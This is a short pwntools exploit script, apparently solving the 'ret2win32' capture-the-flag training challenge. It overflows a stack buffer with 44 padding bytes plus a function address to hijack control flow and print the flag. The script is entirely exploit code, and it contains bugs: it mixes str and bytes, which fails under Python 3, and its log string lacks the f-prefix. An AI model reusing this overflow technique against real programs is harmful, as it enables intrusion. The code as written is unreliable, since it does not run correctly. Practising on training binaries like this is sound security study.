#!/usr/bin/python3

from pwn import *

#context.log_level = 'DEBUG'

binary = ELF('./ret2win32')
ret2win_addr = binary.symbols['ret2win']

p = process('./ret2win32')

p.recvuntil('> ')

p.sendline('A' * 44 + p32(ret2win_addr))

p.recvuntil('flag:')

log.info("Flag: {p.recv(1024).decode()}")
